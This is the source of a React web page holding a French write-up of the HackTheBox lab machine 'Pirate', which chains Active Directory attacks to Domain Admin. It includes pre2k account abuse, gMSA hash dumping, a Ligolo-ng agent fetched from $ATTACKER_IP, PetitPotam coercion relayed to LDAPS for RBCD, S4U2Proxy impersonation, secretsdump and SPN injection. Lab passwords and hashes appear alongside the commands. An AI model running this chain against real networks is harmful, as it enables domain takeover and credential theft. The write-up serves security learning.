import { Terminal, Key, Database, Shield, Network, Users, Lock } from "lucide-react";
import { PageHeader } from "@/components/PageHeader";
import { SpoilerWrapper } from "@/components/SpoilerWrapper";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Pirate | Writeup HTB | 0xbbuddha",
  description:
    "Writeup de la machine Pirate (HackTheBox, Hard, Windows). Chaîne AD complète : Pre2k, gMSA, RBCD via NTLM relay, S4U2Proxy et WriteSPN altservice vers DC01.",
};

export default function WriteupPiratePage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Writeup"
        title="Pirate"
        description="Machine Windows Active Directory Hard. Cinq techniques AD enchaînées sans CVE : legacy machine account, gMSA overpermissioning, NTLM relay vers RBCD, délégation contrainte avec transition de protocole, et injection de SPN pour pivoter jusqu&apos;au DC."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Writeups", href: "/writeups" },
          { label: "Pirate" },
        ]}
        stats={[
          { label: "Platform", value: "HackTheBox" },
          { label: "Difficulty", value: "Hard" },
          { label: "OS", value: "Windows" },
          { label: "Date", value: "2026-05-10" },
        ]}
      />

      <SpoilerWrapper
        machineName="Pirate"
        unlockCodeHash="3093215ced29374daf8f02b59b648698a7513b5afdf827ee0a3d06959b9d8b0b"
      >
      <article className="mt-8 space-y-10">

        {/* ── 1. RECONNAISSANCE ─────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            1. Reconnaissance
          </h2>
          <p className="text-muted-foreground">
            Le scan révèle un contrôleur de domaine classique : DNS, Kerberos, LDAP, SMB, WinRM.
            Le certificat SSL confirme <strong>DC01.pirate.htb</strong>. SMB signing est activé, pas de relay SMB direct possible, il faudra cibler <strong>LDAPS</strong>.
            Je note aussi que la machine est joignable directement sur <code className="rounded bg-muted px-1">10.129.51.233</code> et qu&apos;un réseau interne <strong>192.168.100.0/24</strong> est accessible depuis le DC.
          </p>
          <CodeBlock title="Commande">
{`nmap -Pn -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985 10.129.51.233`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb)
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Énumération RID avec les credentials de départ pour cartographier les comptes du domaine.
          </p>
          <CodeBlock title="Commande">
{`nxc smb 10.129.51.233 -u pentest -p 'p3nt3st2025!&' --rid-brute 2>/dev/null | grep SidTypeUser`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`SMB  DC01  500: PIRATE\Administrator (SidTypeUser)
SMB  DC01  502: PIRATE\krbtgt        (SidTypeUser)
SMB  DC01  1103: PIRATE\MS01$        (SidTypeUser)
SMB  DC01  1104: PIRATE\a.white      (SidTypeUser)
SMB  DC01  1106: PIRATE\a.white_adm  (SidTypeUser)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Je repère deux comptes gMSA inaccessibles avec <strong>pentest</strong>, et surtout le compte machine <strong>MS01$</strong>, j&apos;y reviendrai.
          </p>
          <CodeBlock title="Commande">
{`nxc ldap 10.129.51.233 -u pentest -p 'p3nt3st2025!&' --gmsa`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`LDAP  DC01  [*] Getting GMSA Passwords
LDAP  DC01  Account: gMSA_ADCS_prod$  NTLM: <no read permissions>  PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP  DC01  Account: gMSA_ADFS_prod$  NTLM: <no read permissions>  PrincipalsAllowedToReadPassword: Domain Secure Servers`}
          </CodeBlock>
        </section>

        {/* ── 2. PRE2K ──────────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            2. Pre2k : MS01$ avec son propre nom comme mot de passe
          </h2>
          <p className="text-muted-foreground">
            Avant Windows 2000, les machines jointes au domaine recevaient automatiquement leur hostname en minuscules comme mot de passe de compte machine. Ce comportement legacy persiste si personne n&apos;a jamais forcé la rotation.
            L&apos;outil <strong>pre2k</strong> teste ça automatiquement sur tous les comptes machines du domaine.
          </p>
          <CodeBlock title="Commande">
{`nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`LDAP   DC01  [+] pirate.htb\pentest:p3nt3st2025!&
PRE2K  DC01  Pre-created computer account: MS01$
PRE2K  DC01  Pre-created computer account: EXCH01$
PRE2K  DC01  [+] Found 2 pre-created computer accounts.
PRE2K  DC01  [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K  DC01  [+] Successfully obtained TGT for exch01@pirate.htb`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            <strong>MS01$</strong> a toujours <code className="rounded bg-muted px-1">ms01</code> comme mot de passe. C&apos;est un compte machine valide avec lequel je peux m&apos;authentifier sur le domaine, et donc lire les hashes gMSA.
          </p>
        </section>

        {/* ── 3. gMSA ───────────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            3. Extraction des hashes gMSA
          </h2>
          <p className="text-muted-foreground">
            Les Group Managed Service Accounts ont leurs mots de passe gérés automatiquement par l&apos;AD. Mais
            l&apos;ACL <strong>PrincipalsAllowedToReadPassword</strong> contrôle qui peut lire ces hashes : ici c&apos;est le groupe <strong>Domain Secure Servers</strong>, dont <strong>MS01$</strong> est membre.
            J&apos;utilise son TGT Kerberos pour interroger LDAP avec les bons droits.
          </p>
          <CodeBlock title="Commande">
{`getTGT.py pirate.htb/'MS01$:ms01' -dc-ip 10.129.51.233
KRB5CCNAME=MS01$.ccache nxc ldap 10.129.51.233 --use-kcache --gmsa`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`LDAP  DC01  [+] PIRATE.HTB\MS01$ from ccache
LDAP  DC01  [*] Getting GMSA Passwords
LDAP  DC01  Account: gMSA_ADCS_prod$  NTLM: 2b8849da91d5206b9d1d1dcb44467089  PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP  DC01  Account: gMSA_ADFS_prod$  NTLM: 76754c94319e3a7dc07ba09aa79028ee  PrincipalsAllowedToReadPassword: Domain Secure Servers`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Je vérifie lequel des deux comptes donne accès à DC01 via WinRM.
          </p>
          <CodeBlock title="Commande">
{`nxc winrm 10.129.51.233 -u 'gMSA_ADCS_prod$' -H '2b8849da91d5206b9d1d1dcb44467089'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`WINRM  DC01  [+] pirate.htb\gMSA_ADCS_prod$:2b8849da91d5206b9d1d1dcb44467089 (Pwn3d!)`}
          </CodeBlock>
        </section>

        {/* ── 4. LIGOLO ─────────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            4. Foothold DC01 + pivot Ligolo-ng vers 192.168.100.0/24
          </h2>
          <p className="text-muted-foreground">
            DC01 a une deuxième interface sur le réseau interne <strong>192.168.100.0/24</strong> où se trouve <strong>WEB01</strong> (192.168.100.2).
            Je déploie <strong>Ligolo-ng v0.8.3</strong> : un agent Windows sur DC01 qui crée un tunnel L3 transparent vers mon proxy. Une fois la route injectée, WEB01 est accessible directement comme si j&apos;étais sur le même segment.
          </p>
          <CodeBlock title="Setup interface TUN (sudo)">
{`sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo`}
          </CodeBlock>
          <CodeBlock title="Démarrage proxy Ligolo-ng">
{`/tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601 -daemon`}
          </CodeBlock>
          <CodeBlock title="DC01 via WinRM : téléchargement et démarrage agent">
{`# Upload
Invoke-WebRequest "http://$ATTACKER_IP:8000/agent.exe" -OutFile "C:\Windows\Temp\ligolo-agent.exe" -UseBasicParsing

# Connexion au proxy
Start-Process -NoNewWindow "C:\Windows\Temp\ligolo-agent.exe" "-connect $ATTACKER_IP:11601 -ignore-cert -retry"`}
          </CodeBlock>
          <CodeBlock title="Log proxy (connexion confirmée)" result>
{`[INFO] Agent joined. id=00155d0bd000 name="PIRATE\\gMSA_ADCS_prod$@DC01"
[INFO] Starting autobind session: 00155d0bd000 on interface ligolo
[INFO] Starting tunnel to PIRATE\\gMSA_ADCS_prod$@DC01`}
          </CodeBlock>
          <CodeBlock title="Test connectivité WEB01">
{`ping -c 2 192.168.100.2`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=90 ms
64 bytes from 192.168.100.2: icmp_seq=2 ttl=64 time=100 ms`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            WEB01 est joignable. Je confirme que <strong>gMSA_ADFS_prod$</strong> a accès WinRM dessus.
          </p>
          <CodeBlock title="Commande">
{`nxc winrm 192.168.100.2 -u 'gMSA_ADFS_prod$' -H '76754c94319e3a7dc07ba09aa79028ee'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`WINRM  WEB01  [+] pirate.htb\gMSA_ADFS_prod$:76754c94319e3a7dc07ba09aa79028ee (Pwn3d!)`}
          </CodeBlock>
        </section>

        {/* ── 5. RBCD ───────────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            5. RBCD via NTLM relay : MS01$ délégué sur WEB01$
          </h2>
          <p className="text-muted-foreground">
            Le plan : forcer <strong>WEB01</strong> à s&apos;authentifier vers ma machine via <strong>PetitPotam</strong> (MS-EFSRPC),
            relayer cette auth vers <strong>LDAPS</strong> sur DC01, et écrire l&apos;attribut
            <code className="rounded bg-muted px-1 mx-1">msDS-AllowedToActOnBehalfOfOtherIdentity</code> sur WEB01$ pour y inscrire <strong>MS01$</strong>.
            Comme SMB signing est activé sur DC01, je cible LDAPS et non SMB.
            Le flag <code className="rounded bg-muted px-1">--remove-mic</code> est nécessaire car WEB01 demande la signature NTLM.
          </p>
          <CodeBlock title="ntlmrelayx (sudo, port 445)">
{`sudo ntlmrelayx.py -t ldaps://10.129.51.233 \\
  --delegate-access --escalate-user 'MS01$' \\
  -smb2support --remove-mic`}
          </CodeBlock>
          <CodeBlock title="Résultat (serveurs démarrés)" result>
{`[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections`}
          </CodeBlock>
          <CodeBlock title="PetitPotam : coercion vers notre IP">
{`python3 PetitPotam.py \\
  -u 'gMSA_ADCS_prod$' -hashes ':2b8849da91d5206b9d1d1dcb44467089' \\
  -d pirate.htb \\
  $ATTACKER_IP 192.168.100.2`}
          </CodeBlock>
          <CodeBlock title="Résultat PetitPotam" result>
{`[+] Connected!
[+] Successfully bound!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!`}
          </CodeBlock>
          <CodeBlock title="ntlmrelayx (terminal sudo)" result>
{`[*] Authenticating against ldaps://10.129.51.233 as PIRATE/WEB01$ SUCCEED
[*] Delegation rights modified successfully!
[*] MS01$ can now impersonate users on WEB01$ via S4U2Proxy`}
          </CodeBlock>
          <CodeBlock title="Vérification LDAP">
{`bloodyAD -u pentest -p 'p3nt3st2025!&' -d pirate.htb --host 10.129.51.233 \\
  get object "WEB01$" --attr msDS-AllowedToActOnBehalfOfOtherIdentity`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`msDS-AllowedToActOnBehalfOfOtherIdentity: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-...-4102)
# SID → MS01$`}
          </CodeBlock>
        </section>

        {/* ── 6. S4U2PROXY WEB01 ────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            6. S4U2Proxy : ticket Administrator pour WEB01
          </h2>
          <p className="text-muted-foreground">
            Grâce au RBCD, <strong>MS01$</strong> peut demander un service ticket au nom de n&apos;importe qui sur WEB01.
            J&apos;enchaîne S4U2Self (MS01$ obtient un ticket pour lui-même en tant qu&apos;Administrator) puis S4U2Proxy
            (MS01$ présente ce ticket pour demander <strong>cifs/WEB01.pirate.htb</strong> en tant qu&apos;Administrator).
            Le résultat est un ccache que je passe directement à <code className="rounded bg-muted px-1">secretsdump</code>.
          </p>
          <CodeBlock title="Commande">
{`getTGT.py pirate.htb/'MS01$:ms01' -dc-ip 10.129.51.233

KRB5CCNAME=MS01$.ccache getST.py pirate.htb/'MS01$' \\
  -spn 'cifs/WEB01.pirate.htb' \\
  -impersonate Administrator \\
  -dc-ip 10.129.51.233 -k -no-pass`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache`}
          </CodeBlock>
        </section>

        {/* ── 7. SECRETSDUMP + USER.TXT ─────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            7. secretsdump WEB01 : LSA DefaultPassword + user.txt
          </h2>
          <p className="text-muted-foreground">
            J&apos;utilise le ticket pour dumper WEB01 via le Remote Registry. La vraie trouvaille est dans les
            <strong> LSA Secrets</strong> : une entrée <code className="rounded bg-muted px-1">DefaultPassword</code> laissée par une configuration d&apos;autologon : le mot de passe de <strong>a.white</strong> en clair.
          </p>
          <CodeBlock title="Commande">
{`export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
[*] Dumping LSA Secrets
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu`}
          </CodeBlock>
          <CodeBlock title="Lecture user.txt">
{`nxc smb 192.168.100.2 -k --use-kcache -x 'type C:\\Users\\a.white\\Desktop\\user.txt'`}
          </CodeBlock>
          <CodeBlock title="user.txt" result>
{`REDACTED`}
          </CodeBlock>
        </section>

        {/* ── 8. FORCECHANGEPASSWORD ────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Users className="size-5 text-primary" />
            8. ForceChangePassword : a.white vers a.white_adm
          </h2>
          <p className="text-muted-foreground">
            BloodHound révèle que <strong>a.white</strong> a le droit <code className="rounded bg-muted px-1">ForceChangePassword</code> sur
            <strong> a.white_adm</strong>. Ce compte admin dispose lui d&apos;une délégation contrainte avec transition de protocole vers <code className="rounded bg-muted px-1">HTTP/WEB01</code>, notre prochain levier.
            Je change son mot de passe directement via LDAP sans connaître l&apos;ancien.
          </p>
          <CodeBlock title="Commande">
{`bloodyAD -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb --host 10.129.51.233 \\
  set password 'a.white_adm' 'Password123!'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] Password changed successfully!`}
          </CodeBlock>
          <CodeBlock title="Vérification de la délégation">
{`findDelegation.py pirate.htb/'a.white_adm:Password123!' -dc-ip 10.129.51.233`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`AccountName  AccountType  DelegationType                      DelegationRightsTo
a.white_adm  Person       Constrained w/ Protocol Transition  http/WEB01.pirate.htb
a.white_adm  Person       Constrained w/ Protocol Transition  HTTP/WEB01`}
          </CodeBlock>
        </section>

        {/* ── 9. SPN INJECTION ──────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            9. SPN Injection : déplacer HTTP/WEB01 de WEB01$ vers DC01$
          </h2>
          <p className="text-muted-foreground">
            Voilà la partie subtile. Quand <strong>a.white_adm</strong> fait S4U2Proxy pour <code className="rounded bg-muted px-1">HTTP/WEB01.pirate.htb</code>,
            le KDC chiffre le service ticket avec la clé du compte qui <em>possède</em> ce SPN.
            Si le SPN est sur <strong>WEB01$</strong>, le ticket est chiffré avec sa clé, inutilisable sur DC01.
            Si je déplace le SPN vers <strong>DC01$</strong>, le ticket est chiffré avec la clé de DC01$, et
            le flag <code className="rounded bg-muted px-1">-altservice CIFS/DC01</code> peut réécrire le nom de service sans invalider le chiffrement.
          </p>
          <p className="mt-2 text-muted-foreground">
            <strong>a.white_adm</strong> a le droit <code className="rounded bg-muted px-1">WriteSPN</code> sur DC01$ (via le groupe IT). Je commence par vider les SPNs de WEB01$ pour lever la contrainte d&apos;unicité forest-wide, puis j&apos;injecte sur DC01$.
          </p>
          <CodeBlock title="État initial de WEB01$">
{`bloodyAD -u 'a.white_adm' -p 'Password123!' -d pirate.htb --host 10.129.51.233 \\
  get object "WEB01$" --attr servicePrincipalName`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`servicePrincipalName: tapinego/WEB01; WSMAN/WEB01; HOST/WEB01; TERMSRV/WEB01; HTTP/WEB01; HTTP/WEB01.pirate.htb; ...`}
          </CodeBlock>
          <CodeBlock title="Suppression de tous les SPNs sur WEB01$">
{`bloodyAD -u 'a.white_adm' -p 'Password123!' -d pirate.htb --host 10.129.51.233 \\
  set object 'WEB01$' servicePrincipalName`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] WEB01$'s servicePrincipalName has been updated`}
          </CodeBlock>
          <CodeBlock title="Injection de HTTP/WEB01 sur DC01$">
{`bloodyAD -u 'a.white_adm' -p 'Password123!' -d pirate.htb --host 10.129.51.233 \\
  set object 'DC01$' servicePrincipalName \\
  -v 'HTTP/WEB01' -v 'HTTP/WEB01.pirate.htb'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] DC01$'s servicePrincipalName has been updated`}
          </CodeBlock>
          <CodeBlock title="Vérification">
{`bloodyAD -u 'a.white_adm' -p 'Password123!' -d pirate.htb --host 10.129.51.233 \\
  get object "DC01$" --attr servicePrincipalName | grep HTTP`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`servicePrincipalName: HTTP/WEB01.pirate.htb; HTTP/WEB01`}
          </CodeBlock>
        </section>

        {/* ── 10. ALTSERVICE → DC01 ─────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            10. S4U2Proxy + altservice : ticket Administrator CIFS/DC01
          </h2>
          <p className="text-muted-foreground">
            Je refais le S4U2Proxy depuis <strong>a.white_adm</strong> pour <code className="rounded bg-muted px-1">HTTP/WEB01.pirate.htb</code>.
            Cette fois le KDC chiffre avec la clé de <strong>DC01$</strong> (qui possède maintenant ce SPN).
            Impacket réécrit ensuite le <em>sname</em> du ticket de <code className="rounded bg-muted px-1">HTTP/WEB01</code> vers <code className="rounded bg-muted px-1">CIFS/DC01.pirate.htb</code> : le chiffrement reste valide car les deux SPNs appartiennent au même compte machine.
          </p>
          <CodeBlock title="Commande">
{`getST.py \\
  -spn 'HTTP/WEB01.pirate.htb' \\
  -impersonate 'Administrator' \\
  'pirate.htb/a.white_adm:Password123!' \\
  -dc-ip 10.129.51.233 \\
  -altservice 'CIFS/DC01.pirate.htb'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache`}
          </CodeBlock>
        </section>

        {/* ── 11. ROOT.TXT ──────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Lock className="size-5 text-primary" />
            11. root.txt
          </h2>
          <p className="text-muted-foreground">
            Le ticket CIFS/DC01 au nom d&apos;Administrator est présenté à DC01. SMB signing est géré nativement par Kerberos, pas de friction.
            Je suis Domain Admin.
          </p>
          <CodeBlock title="Commande">
{`export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
nxc smb DC01.pirate.htb --use-kcache -x 'type C:\\Users\\Administrator\\Desktop\\root.txt'`}
          </CodeBlock>
          <CodeBlock title="root.txt" result>
{`REDACTED`}
          </CodeBlock>
        </section>

        {/* ── RECAP ─────────────────────────────────────────────────────── */}
        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li><strong>Pre2k</strong> : MS01$ a toujours son hostname comme mot de passe → accès machine account</li>
            <li><strong>gMSA</strong> : MS01$ membre de Domain Secure Servers → lecture des hashes gMSA_ADCS_prod$ et gMSA_ADFS_prod$</li>
            <li><strong>WinRM DC01</strong> : gMSA_ADCS_prod$ est admin local → foothold + déploiement Ligolo-ng</li>
            <li><strong>Ligolo-ng</strong> : tunnel L3 transparent → 192.168.100.2 (WEB01) directement joignable</li>
            <li><strong>RBCD</strong> : PetitPotam coerce WEB01$ → ntlmrelayx relay vers LDAPS → MS01$ inscrit dans msDS-AllowedToActOnBehalfOfOtherIdentity de WEB01$</li>
            <li><strong>S4U2Proxy</strong> : MS01$ impersonate Administrator sur WEB01 (CIFS) → secretsdump → LSA DefaultPassword → a.white:E2nvAOKSz5Xz2MJu + user.txt</li>
            <li><strong>ForceChangePassword</strong> : a.white change le mot de passe de a.white_adm (délégation contrainte avec Protocol Transition sur HTTP/WEB01)</li>
            <li><strong>SPN Injection</strong> : HTTP/WEB01 déplacé de WEB01$ vers DC01$ (WriteSPN via groupe IT)</li>
            <li><strong>altservice</strong> : S4U2Proxy HTTP/WEB01 (chiffré avec clé DC01$) réécrit en CIFS/DC01 → ticket Administrator valide sur DC01</li>
            <li><strong>root.txt</strong> via nxc smb avec le ticket Kerberos</li>
          </ul>
        </section>

      </article>
      </SpoilerWrapper>
    </div>
  );
}
